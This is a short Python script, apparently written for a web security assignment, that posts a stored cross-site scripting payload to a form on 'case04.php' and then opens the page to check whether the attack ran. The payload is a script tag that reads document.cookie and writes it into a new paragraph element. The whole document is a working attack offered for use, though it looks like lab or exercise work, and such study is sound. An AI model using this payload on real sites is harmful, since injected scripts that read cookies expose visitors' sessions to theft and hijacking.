import requests
import webbrowser
base_url="http://www.wsb.com/Assignment2/case04.php"
#payload create a <p> and write cookie in it 
payload={"title":"yumingyuan","content":"<script>div_object=document.createElement('p');div_object.id='yum1ngyuan';div_object.innerHTML=document.cookie;document.body.appendChild(div_object);</script>"}
#post malicious code
r=requests.post(base_url,data=payload)
#try to get flag use web browser to open check attack result
webbrowser.open("http://www.wsb.com/Assignment2/case04.php")
